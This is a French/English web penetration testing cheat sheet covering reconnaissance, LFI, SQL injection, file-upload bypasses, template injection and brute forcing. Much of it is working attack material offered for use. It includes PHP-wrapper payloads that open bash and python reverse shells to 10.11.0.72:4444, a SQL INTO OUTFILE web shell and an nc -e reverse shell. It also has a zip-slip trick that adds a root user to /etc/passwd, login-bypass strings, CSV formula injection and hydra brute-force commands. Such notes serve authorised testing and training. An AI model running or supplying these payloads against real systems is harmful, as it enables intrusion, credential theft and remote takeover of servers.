# Web penetration test methodology 

1. [Tips](#Tips)
2. [Footprint](#Footprint)
	1. [subdomain](#subdomain)
	2. [Manual connection](#Manual-connection)
		1. [HTTP methods](#HTTP-methods)
	3. [Directory listing](#Directory-listing)
	4. [Vulnerabilities scanners](#Vulnerabilities-scanners)
	5. [Nmap NSE](#Nmap-NSE)
	6. [Wordpress](#Wordpress)
	7. [IIS](#IIS)
	8. [Drupal](#Drupal)
	8. [SSL configuration](#SSL-configuration)
	9. [Web Server Gateway Interface](#Web-Server-Gateway-Interface)
	10. [CGI](#CGI)
	11. [Web host](#Web-host)
3. [WebDAV](#WebDAV)
4. [RFI](#RFI) 
5. [LFI](#LFI)
	1. [Manually](#Manually)
	2. [Automatically](#Automatically)
6. [HTTP header injection](#HTTP-header-injection)
7. [Open redirect](#Open-redirect)
8. [JSON Web Token](#JSON-Web-Token)
9. [CORS](#CORS)
11. [XXE](#XXE)
12. [SQLi](#SQLi)
	1. [Manual](#Manual)
		1. [Identifier le champ vulnérable](#Identifier-le-champ-vulnérable)
		2. [Déterminer le nombre de colonnes](#Déterminer-le-nombre-de-colonnes)
		3. [Afficher des informations](#Afficher-des-informations)
		4. [Extraire des données basique](#Extraire-des-données-basique)
		5. [Extraire des données death row](#Extraire-des-données-death-row)
		6. [Etraire des données time based](#Etraire-des-données-time-based)
		7. [Bypass Login](#Bypass-Login)
		8. [SQLi to shell](#SQLi-to-shell)
	2. [Automated](#Automated)
13. [XSS](#XSS)
14. [Upload feature](#Upload-feature)
15. [Template injection](#Template-injection)
	1. [Wordpress](#Wordpress)
16. [Reverse Shell](#Reverse-Shell)
17. [Command injection](#Command-injection)
	1. [Bash](#Bash)
	2. [PHP](#PHP)
18. [Web cache](#Web-cache)
19. [Page host-manager sur Tomcat](#Page-host-manager-sur-Tomcat)
21. [App JAVA](#App-JAVA)
21. [Injection inside CSV](#Injection-inside-CSV)
22. [Injection dans les logs](#Injection-dans-les-logs)
23. [Weak credentials](#Weak-credentials)
24. [SSRF](#SSRF)
25. [MQ](#MQ)

# Tips

- https://requestbin.com
- https://beeceptor.com/
- https://postb.in
- http://webhook.site/
- https://ngrok.com/

- FoxyProxy
- Burp tips : 
	- Right clic / Encoded as you type
		- Ou selectionner le texte et faire Ctrl+U
	- http://burp -> .cacert
	- Dans intruder / options : Grep-Match : on peut définir un pattern à rechercher au sein des réponses, Burp identifie ensuite les réponses contenant ce pattern
	- https://github.com/portswigger/http-request-smuggler

https://addons.mozilla.org/en-US/firefox/addon/hackbartool/?src=search

# Footprint

- Look for the web application name (footer, social network linked ...)
	- If OpenSource -> Search for the sources (GitHub repo ...)
		- Check the Changelog on the README.MD
		- Look for adminitrative panel
		- Look for vulnerabilities in the Issues of the Github
- Read the source code HTML/JS 
	- Look for the used technoly
		- Ex: `CMS Made Simple`
	- Look for URL/URI
- Look for network connection make by the application
- Look for web pages extensions (php, html, asp(x))
	- If something is changing, it is dynamic

## subdomain

- `wfuzz -c -w /mnt/hgfs/PARTAGE-VM/SHARED/TOOLS/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H "HOST:FUZZ.<domaine>.<tld>" http://<domaine>.<tld>`
	- `--hl <NUMBER_OF_LINE_WHEN_400>`
	- `–ss and –hs allow to filter the responses using a regular expression against the returned content`
	
- Add `<DOMAIN>` in `/etc/hosts`

- Use cewl to find key word and make a specific wordlist

## Manual connection

- `openssl s_client -connect <IP>:<PORT>`
	- `R` to test renegociation
- `nc <IP> <PORT>`
	- `curl <IP> -s -L | html2text -width '99'`
	- `curl <IP> -s -L | grep "title\|href"`

### HTTPS certificate

- Check certificate information
	- Issuer
	- Certificate Subject Alt Name (looking for subdomains)
	
Check if there is some (sub)domain o the email address

### HTTP methods

- `OPTIONS /path HTTP/1.0`
	- If `PUT` is possible without authentication : `curl --upload-file  <FILE>.txt -v --url http://<IP>/<PATH>/<FILE> -0 --http1.0`

## Directory listing

- `gobuster -u <IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e`
	- Add `-k` due to https protocol

- `dirb <IP> /usr/share/seclists/Discovery/Web-Content/big.txt`

- Wordlists : 
	- dirb : `/usr/share/wordlists/dirb`
	- wfuzz : `/usr/share/wfuzz/wordlist`
	- seclist : `/usr/share/seclists`
- Start with a little one as `common`, then a biggest then a wordlist dedicated to a technology (IIS, Apache, nginx ...)

- Start enumerate on **subfolders** AND **files**
	- Ex: Start on <ip>
		- Then on `<ip>/sub-folder`
		- Then on `<ip>/index.php`

- When you find a file start enumerate the extension 
	- Wordlists : 
		- /opt/wordlists/ContentDiscovery/common-extensions.txt
		- /usr/share/wfuzz/wordlist/general/extensions_common.txt
		- /usr/share/dirb/wordlists/extensions_common.txt
			- Ex: `.php~` -> backup for PHP file, could leak the source code

- Acces to a Git repo
	- Check every commit looking for password
		- `git log`
		- `git reflog`

## Vulnerabilities scanners

- `nikto -host <IP>`
- Nessus

## Nmap NSE

- Apache : `sudo nmap -p<PORT> --script "*apache*" -vvv -oA <FILE> <IP>`
- IIS : `sudo nmap -p<PORT> --script "*iis*" -vvv -oA <FILE> <IP>`
- Webdav : `sudo nmap -p<PORT> --script "*webdav*" -vvv -oA <FILE> <IP>`
- Shellshock : `sudo nmap -p80 --script "*shellshock*" --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi -vvv -oA <FILE> <IP>`
	- To start if you find a `/cgi-bin` directory
- BigData : 
	- http-enum
	- hbase-master-info.nse
	- hbase-region-info.nse	
	- flume-master-info.nse	

## Wordpress

- Enumérer les plugins : `wpscan --url http://<IP>/<PATH>/ --enumerate p`
	- Tous les plugins : `ap`
- Enumérer les themes : `wpscan --url http://<IP>/<PATH>/ --enumerate t`
	- Tous les themes : `at`
- Enumérer les utilisateurs : `wpscan --url http://<IP>/<PATH>/ --enumerate u`

- Désactiver le check SSL : `--disable-tls-checks`

- Dossiers/fichiers WP interessant : 
	- http://<IP>/wp/
	- http://<IP>/wp-admin/
	- http://<IP>/wp-content/ : Plugins for wordpress directory
		- Check the version of each plugin and the associated vulnerabilities
	- http://<IP>/wp-login.php
	- http://<IP>/wp-config.php : Credentials for DB

- Utiliser `searchsploit` en plus de `wp-scan` pour trouver des vulnérabilité sur les plugins

## IIS

- https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
- https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
- https://soroush.secproject.com/blog/2014/07/file-upload-and-php-on-iis-wildcards/

ASP, ASPX, ASP-EXE

### IIS shortname vulnerability

- https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf
- https://github.com/lijiejie/IIS_shortname_Scanner
- https://en.wikipedia.org/wiki/8.3_filename
- https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#recon

## Drupal

- `droopescan`

- To get the version : `<IP>\CHANGELOG.txt`

- Enable PHP code in Modules - PHP filter (from admin panel)
	- Create an Article
		- RCE

## SSL configuration

- sslscan: `sslscan <IP>`
- testssl
- sslyze : https://github.com/nabla-c0d3/sslyze
	- `sslyze --heartbleed <IP>`

## Web Server Gateway Interface

- WSGI
	- Example : Werkzeug

```python
>>> import socket
>>> print(socket.gethostname())
```

```python
>>> import os
>>> print(os.environ)
```

```python
>>> f = os.popen("<command-system>")
>>> r = f.read()
>>> print("", r)
```

##  CGI

- mod_cgi : handles all the CGI requests
	- La présence /cgi-bin/<> permet de savoir que Apache's mod_cgi is enabled

- CGI-based web server : When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request. OpenSSH server ; DHCP clients ; Qmail clients ; IBM HMC restricted shell

> WiP shellshock

Web CGI programs can be written in any language which can process standard input (stdin), environment variables and write to standard output (stdout)
Ex : http://www.yolinux.com/TUTORIALS/BashShellCgi.html

On peut déposer un script shell/php/perl/python/... dans CGI bin pour le faire exécuter par l'application web. Si l'app web tourne en root le script sera lancé dans un context root (lancer un shell, créer un utilisateur ...)
Doit commencer par echo/print/... "Content-type: text/html"

Code : 
```bash
#!/bin/bash
echo "Content-type: text/html"		# Mandatory
echo ""								# Mandatory
echo "<html><head><title>Bash as CGI"
echo "</title></head><body>"

echo "<h1>Hello world</h1>"
echo "Today is $(<COMMAND>)"

echo "</body></html>"
``` 
Ajouter droits d'exécution : chmod +x first.cgi

- Red Hat Enterprise, 7.x-9, Fedora core, CentOS		`/var/www/cgi-bin/`
- Red Hat 6.x and older									`/home/httpd/cgi-bin/`
- SuSe													`/srv/www/cgi-bin/`
- Ubuntu/Debian											`/usr/lib/cgi-bin/`

# Web host

- AWS : 
	- https://github.com/s-lck/WholePentesterGuides/blob/master/web/AWS/AWS.md
	- https://github.com/brianwarehime/inSp3ctor
- Azure : 
	- https://github.com/s-lck/WholePentesterGuides/blob/master/web/Azure.md
	- https://nostarch.com/azure
	- https://github.com/NetSPI/MicroBurst

# WebDAV

- WebDav est une extension du protocole HTTP
	- Simplifie la gestion des fichiers
		- Permet de récupérer/déposer/synchroniser/publier fichiers/dossiers rapidement/facilement
		- Permet à plusieurs utilisateurs d'éditer simultanément le contenus d'un fichier. Gestion des accés/droits
	- Ajoute les méthodes suivantes : COPY, LOCK, MKCOL, MOVE, PROPFIND, PROPPATCH, UNLOCK

- L'outil va tenter de download et d'executer divers fichiers de diverses extensions : `davtest -url <URL>`
- Upload un fichier en ajoutant l'extension .txt pour bypass les restrictions : `davtest -url <URL> -uploadfile <REVERSE-SEHLL>.asp -uploadloc <REVERSE-SHELL>.asp.txt -debug 3`
- `cadaver http://10.11.1.229/`
	- `dav:/> move rs-asp.asp.txt /rs/rs-asp.asp;.txt`
		- Le `;` permet d'indiquer la fin de ligne
		- Il se peut qu'un message d'erreur s'affiche mais que le `move` ai quand même fonctionné
- On se met en écoute et on se rends sur l'URL contenant le reverse shell

# RFI 

- On Kali : `nc -nlvp <PORT>`
- On target : `param=http://<IP>/<PORT>/<FILE>`
	- If `http` wrapper is disable try `ftp` - `expect`

# LFI
## Manually

- `php://filter/convert.base64-encode/resource=`
	- Le wrapper encode le code source en base64, le serveur ne peut donc pas exécuter le code puisqu'il ne trouve pas le <? php ?>, il renvoie donc le base 64
	- Copy and paste result in `<file>` then `cat <file> |base64 -d`
- Null byte injection : `param=/etc/passwd%00`
	- Works in versions below php 5.3
- Display PHPINFO : `param=phpinfo`
	- Vérifier les élements suivants: 
		- `allow_url_fopen`
		- `allow_url_include` : Si **Off** ont ne peut pas aller récupérer un fichier depuis un web server
		- `Supported filetypes`


- `curl -s --data-urlencode param=../../../../../../../../../etc/passwd http://<IP>/<PATH>/<FILE>.php`


- LFI to RCE via phpinfo() - Winning The Race 
	- Si on peut GET phpinfo.php  - peut upload fichier
		- Changer la requête en `POST`
		- Changer `Content-Type` en `multipart/form-data; boundary=--SomeTextHere`
		- Ajouter 
		
			```
			----SomeTextHere
			Content-Disposition: form-data; name="anything"; filename="FileName"
			Content-Type: text/plain
			
			This is the file content
			----SomeTextHere
			```
		
		- Envoyer la requete et verifier si dans  la partie "PHP variable" un fichier nommé "FileName" est présent
			- Si oui on verra aussi son chemin
	
	- https://www.insomniasec.com/downloads/publications/phpinfolfi.py
		- Make a request
		- Sent big file who takes PHP time to process
		- Soon as the page finish loading PHP delete the file
		- Hitting the LFI before PHP delete the file
		- Modify the script
			- `PAYLOAD` : Put the payload between the `\r`, can add a full RS PHP on several lines
			- `LFIREQ` : Adapt in function of your environment - the `%s` is the filename
		- Start the script : `python phpinfolfi.py <IP> <PORT> <THREADS-NUMBER>`
			
```
/proc/self/environ
/proc/self/fd
php://input
php://input%00
``` 

- Requete : 
```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
page=Exploit PHP Wrappers
```

- Reponse (si fonctionne, répétition de la variable page) :  
```
HTTP/1.1 200 OK
[...]
page=Exploit PHP Wrappers
```

- Requete : 
```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
<?php echo shell_exec('id'); ?>
```

- Reponse (si fonctionne, exécute le code PHP) :  
```
HTTP/1.1 200 OK
[...]
uid=48(<XXX>) gid=48(<XXX>) groups=48(<XXX>)
```

- Using curl to get command execution : `curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`

- Using Burp to get a bash reverse shell :
	```
	POST /section.php?page=php://input%00 HTTP/1.1
	[...]
	<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>        
	```
- Using curl to get a bash reverse shell : - `curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`

- Using Burp to get a python reverse shell :
	```
	POST /section.php?page=php://input%00 HTTP/1.1
	[...]
	<?php echo shell_exec(' python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' '); ?>
	```
	- /!\ Il faut \ les ' qui sont dans la commande python


- File to check 
	- Unix
		- dolibar : /conf/conf.php
		- drupal : dbconfig.php
		- apache : /etc/apache2/apache2.conf - /etc/apache2/sites-available/default - /usr/local/etc/apache22/httpd.conf
		- /etc/passwd
		- /etc/shadow
		- /etc/group
		- /etc/sudoers
	- Windows
		- WiP

- PHP function `include()` execute PHP between `<?php ?>`
	- Except if we use `php://filter/convert.base64-encode`

## Automatically

- kadimus
	
# HTTP header injection

> WiP

# Open redirect

> WiP

# JSON Web Token

> WiP

- `hashcat -a3 -m 16500 jwt --force`

# CORS

> WiP

# XXE
	Out of Band -> faire renvoyer sur son propre serveur
	Format SVG contient du XML
	
https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf
https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/	

```XML
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY ent SYSTEM "file:///etc/passwd">]>
<data>&ent;</data>
```

- The `ent` variable can be injected in whatever `<balise>`
	
# SQLi

http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html

## Manual
### Identifier le champ vulnérable
- ` ' `
- Operation arithmetique, vérifier si `cod=4-2` renvoie la même chose que `code=2`

### Déterminer le nombre de colonnes

- Utiliser UNION SELECT plutot que ORDER BY		
	- Identifier le nombre de colonnes et les colonnes vulnérables à l'affichage d'information : `id=-1 union select 1,2,3,4,5,6--`


### Afficher des informations

- `version()`
- `database()`
- `user()`


### Extraire des données basique

- WiP


### Extraire des données death row


(**death row** -> utilisation de `group_concat()`)	

- Bien positionner <param> à **-1** (ou autre valeur entrainant l'absence de résultat)
	- Renvoie si tu ajoutes le `union select`
- Group_concat function have a limit of 1024 characters and it will Trim the rest of characters		
	- Dump **ALL the LINES** in **ONE REQUEST** with `CAST(GROUP_CONCAT() AS CHAR(<SIZE>))`

- Concaténer noms des tables de la BDD courante : `param=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--`
- Concaténer noms des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--`
	-  CHAR() contient le nom de la table encodé
- Concaténer contenus des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(<COLUMN_1>,0x3a,<COLUMN_2>),3,4,5,6 from <TABLE>--`


WiP : 
- Si pas de retour sur la page --> BLIND
	- ex: panel auth
		- 1=1 : page qui indique que ça a marché
		- 2=1 : page qui indique que ça a PAS marché
		- comparer les résultats entre 1=1 et 1=2
- On peut utiliser len() pour identifier la version en BLIND, simplement en voyant le rendus de la page 
- Utiliser LIKE '_'
- SELECT INTO_FILE

### Extraire des données time based

- benchmark -> realise une action complique X fois
	- select benchmark(500000,MD5(xxx)) as dual where database() like '______'					
- sleep

```			
ensuite scripter pour trouver les caractéres 1 par 1
définir un charset contenant "a-z,A-Z,1-9,-"
for c in charset
	string "" + c  + "______"
	date à 't'
	faire la requete
	date à 't+requete'
	faire la différence entre t & t+requete
	
Réexecuter le script manuellement pour chaque caractere 
	Pour chaque caractére trouvé, faire
		string "x" + c  + "_____"
			string "xy" + c  + "____"
				string "xyz" + c  + "___"
					string "xyza" + c  + "__"
						string "xyzab" + c  + "_"
							...
La comparaison peut aussi être faite en utilisatn substring()
```

- Pour time based on peut aussi faire LIKE '<char-to-test>%'
	- tester tous les char 1 par 1 et décaler le %
		- quand sur le niém char on a testé tout le charset et que ça ne marche pas, on sait qu'on a atteint la taille max

- On peut Dump In One Shot en BLIND/TIME BASED
- mettre les noms des tables en HEXA pour eviter de mettre des quotes
- timbe based implique blind
- exemple dans une requete POST
	- `param1=xxxx&param2=xxx'||sleep(1)||'&param3=xxx`

- ERROR BASED

- Dump All In One Shot

- INTO OUTFILE (everse shell using SQL Injection)
	- Ecrire du code PHP dans un nouveau fichier .php : `mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/<PATH>/wp-content/<PATH>/<FILE>.php";`
	- Faire exécuter des commandes en les passant en paramétre au fichier .php : `https://<IP>:<PORT>/<PATH>/wp-content/<PATH>/<FILE>.php?cmd=<COMMAND>`
		- Récupérer un RS via l'exécuter de commandes du fichier .php : `?cmd=<REVERSE-SHELL>`

- SQL -> exfiltration via DNS

- leettime.com : entrainement SQLi
- rootme
- zenksecurity	

### Bypass Login:

- Champ user : `' OR 1=1 -- #`
- Champ user : `' or '1'='1`
	- `SELECT * FROM users WHERE username='$username' AND password='$password'`
- Champ user : `admin' -- -`	
- Champ mdp : `1' or '1'='1`

```
POST /login-off.asp HTTP/1.1
[...]    
txtLoginID=%27+OR+1%3D1--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login    
```	

- `txtLoginID=admin&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
- `txtLoginID=%27+OR+1%3D2--&txtPassword=%27+OR+1%3D2--&cmdSubmit=Login`

- Redirection vers la page de login : `' OR 1=2--`
- Identification du nombres de colonnes : `txtLoginID=%20+UNION+SELECT+1,2,3,4--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
	- Si on ajoute / retire un chiffre on a une erreur 500 tout de suite, sans redirection

### SQLi to shell

- Death row : WiP
	- Interroger le web shell : `curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://<IP>/<FILE>.php?cmd=whoami'`
	- Déployer un reverse shell : `GET /<FILE>.php?cmd=echo+'nc+-e /bin/sh <IP> <PORT>' > <FILE>.sh`
	- Ajouter les droits d'exécution : `GET /<FILE>.php?cmd=chmod +x <FILE>.sh`
	- Exécuter le reverse shell : `GET /<FILE>.php?cmd=./<FILE>.sh`

## Automated

- Confirme avec WFUZZ le nombre de colonnes (en comparrant le nombre de LINES, WORD, CHARS):
    - `wfuzz -c -b "<COOKIE_1>=<VALUE_1>; <COOKIE_2>=<VALUE_2>" -z range,1-15 "http://<IP>:<PORT>/<PATH>/<FILE>.php?tg=delegat&idx=mem&id=1 order by FUZZ"`

- ̀Déterminer les bases de données présentes : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" --dbs`
- Afficher les tables d'une base de donnée : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id --tables -D <DB-name>`
- Récupérer le contenus d'une table : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id -T <TABLE> --dump`

- Récupérer un shell : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?cod=1" -p <PARAM> --level 4 --risk 3 --dbms=MySQL --os-shell`
- Récupérer identifiants : `sqlmap -u 'http://<IP>/<PATH>/<FILE>.php?cod=5' --users --passwords`


- Faire la requete via burp - Copier la reqête - Sauvegarder dans un fichier .req - `sqlmap -r <FILE>.req`
	- `sqlmap -r <FILE> -p <PARAM> --force-ssl`
	
# XSS

Cross-Site Tracing (XST) : XSS + HTTP TRACE method

Mindmap : https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png
https://github.com/s0md3v/AwesomeXSS

	Vol de cookie
	iframe, exploit navigateur

- Si `alert(` est interdit utiliser : `a=alert;a(1)`

# Upload feature

En cas d'accés en tant qu'administrateur, tester l'upload dans les divers menu (changement de logo  ...)

- Contourner les protections : 
	- Magic number
		- GIF : GIF89a
	- Casse extension
		- `<FILE>.pHp`
	- Upload un fichier .<EXTENSION>.JPEG (ou autre format accepté)
		- Intercepter via Burp et changer l'extension
	- Modifier le **Content-Type** via BURP
		- `Content-Type: application/x-php`
	- Ajouter un  null byte `%00` au sein de l'extension
	- Blacklist d'extension peut restrictif
		- Extension PHP fonctionnelles : `phtml` - `php4` - `php3` - `php5` - `phps` - `phar`

- Les données EXIF (Exchangeable image file format) peuvent être supprimées des images JPEG/TIFF/RIFF
- Les données iTXt, tEXt, and zTXt peuvent être supprimées des images PNG
	- Encoding Web Shells in PNG IDAT chunks : https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
	- Exploiting PHP-GD imagecreatefromgif() function : https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif
	
- Renommer son fichier avec une injection XSS pour obtenir une XSS lors du download de fichier

https://brutelogic.com.br/blog/file-upload-xss/
https://blog.bentkowski.info/2015/05/xss-via-file-upload-wwwgooglecom.html	
https://github.com/xapax/security/blob/master/bypass_image_upload.md
		
- Injection du JS dans un fichier
	- `convert wallhaven.jpg -set 'Copyright' '/><script>alert("1");</script>' -set 'Title' '/><script>alert("2");</script>' -set comment '/><script>alert("3");</script>' OUT.png`

- Injecter phpinfo() à la fin de l'image `echo <?php phpinfo(); ?> >> <FILE>.jpeg`
- Injection possible aussi en injectant du code dans les metadata
	- `exiftool -t <PICTURE>`
		- Attention, les appli peuvent supprimer les metadata des images et donc le code PHP ne s'executerai pas
- Modifier l'extension de `<FILE>.jpeg` via Burp
- Modifier le chemin d'upload du fichier (ex: `../../../`), il est possible qu'il soit impossible d'exécuter certain type de fichier dans les dossiers d'images (.htaccess)
- Se rendre sur l'URL ou l'image/fichier PHP a été téléchargé, le code JPEG va s'afficher au début suivit du résultat du `phpinfo()`


- Contenus : `/opt/wordlists/fuzzdb/attack/file-upload`

Tester le composant de traitement d'image : 

- Upload une image
	- L'afficher via URL
		- La télécharger depuis le site web
			- Vérifier si c'est la même que celle télécharger
				- Si ce n'est pas la même cela permet de savoir que l'image a été traitée
					- Essayer d'upload une image exploitant une vulnérabilité dans le composant traitant l'image

Upload un .lnk qui pointe sur une autre image


On peut ajouter un code PHP qui permet de récupérer un param GET
	On peut encoder le param en base64


- Upload de fichier .ZIP : 

zip slip : happens when the archive has files with directory traversal paths in their names

If the target is vulnerable it will write the extracted files to the specified paths

- Use zip exploit to deploy a shell 
	- `zip shell.zip ../../../../../../../../../../var/www/html/shell.php`
		- to put a shell in /var/www/html
	- `nc -nlvp <PORT>`
	- Execute the php file
- Use the zip exploit to overwrite `/etc/passwd`
	- Generate the hash of the password : `openssl passwd AAAA`
	- `echo "<NEW_USER>:<HASHES>:0:0:root:/root:/bin/bash" >> passwd`
	- ̀`zip passwd.zip ../../../../../../../../etc/passwd`
	- `su <NEW_USER>`

# Template injection

En cas d'accés à une interface d'administration web, vérifier si il est possible de modifier les templates. Si oui, templacer un fichier d'aide/d'informations par un reverse shell


Tenter dés qu'on est admin dans une interface de CMS


## Wordpress

Modifier un fichier PHP au sein d'un THEME existant de façon a mettre un REVERSE SHELL
- Appearance > Editor
    - Theme par défaut
    	- Fichier <FILE>.PHP
            - Copier le code de `/usr/share/webshells/php/php-reverse-shell.php` (en modifier `$IP` & `$PORT`)
                - Enregister
- Se rendre sur `http://<IP>/wp/wp-content/themes/default/<FILE>.php`

# Reverse Shell
	PHP : msfvenom -p php/reverse_php LHOST=10.11.0.72 LPORT=4444 -f raw > msf-rs.php
	WAR
	EAR
	ASP
	JSP

# Command injection

- Command injection à travers le NOM du fichier 

## Bash
- `; id`
- `; bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

## PHP

- Function `preg_replace`


# Web cache

> WiP

# Page /host-manager sur Tomcat	

Possible de requeter sur /manager/html ou /text 
Possible de deployer WAR via API


# App JAVA

Remplacer .faces par xhtml

# Injection inside CSV

Si l'application permet de générer des fichiers .CSV à partir de données utilisateur il est possible d'injecter des commandes

- `=cmd|' /C notepad'!'A1'`

# Injection dans les logs

Through Burp interceptor/repeater : 

- Through the login field : `login%0d%0aTEST`
- Through the `User-Agent`
	- The `"` could be escaped
	- `<?php echo('Test here'); ?>`
		- If you can include the log file through a PHP file, the PHP will be executed
	- system($_REQUEST['param']);
		- `<FILE>.php=<FILE>.log&param=<COMMAND>`

Le `%0d%0a` va entrainer la création d'une nouvelle ligne en cas d'injection réussis

# Weak credentials

- `wfuzz -c -u <URL> -X POST -d "Username=<USERNAME>&Password=FUZZ&Submit=Login" -w <PASSWORd_LIST>`

- You can use `./EyeWitness.py -x nmap-output.xml --all-protocols` to take a screenshot of each interfaces and test default password.

- `aquatone` WiP

- GET : `hydra -L <USER_WORDLIST> -P <PASSWORD_WORDLIST> -f <IP> http-get <URL>`
- POST : `hydra -L <USER_WORDLIST> -P <PASSWORD_WORDLIST> -f <IP> http-post-form "<URL>:username=^USER^&password=^PASSWORD^:<ERROR-MESSAGE>"`
	- The `username` and `password` password variable depends of the context
		- Intercept first with burp and copy the POST data
	- The `<ERROR-MESSAGE>` depends of the context
- HTTPS : HTTPS-FORM-GET, HTTPS-GET, HTTPS-POST	

- `patator` WiP

- Several Metasploit plugins can be used, as:
    - `auxiliary/scanner/http/http_login` 
	- `auxiliary/scanner/http/tomcat_mgr_login`                          
 
# SSRF

- Start a web server : `python -m SimpleHTTPServer`
- Try to reach your server : `http://<IP>:<PORT>`

- Try to access files : `file:///etc/passwd`
	- Try changing `file` case in case of filter on the keyword
- Try to reach the target locally : `http://localhost:<OPEN-PORT>`
	- Port scan : `wfuzz -c - z range,1-65535 http://<IP>:<PORT><PATH-TO-SSRF>/param=http://localhost:FUZZ`
		- Filter : `--hc/hl/hw/hh`
		
# MQ

- `sudo apt-get install -y python3-pip`
- `sudo pip install -r requirements.txt`
- `cd nteletaor_lib`
- `python enteletaor.py -v scan -t 10.2.22.53 -p22000,26001`

```
[ * ] Starting Enteletaor execution
[ * ]   - Number of targets to analyze: 1
[...]
[ * ] Done!
```

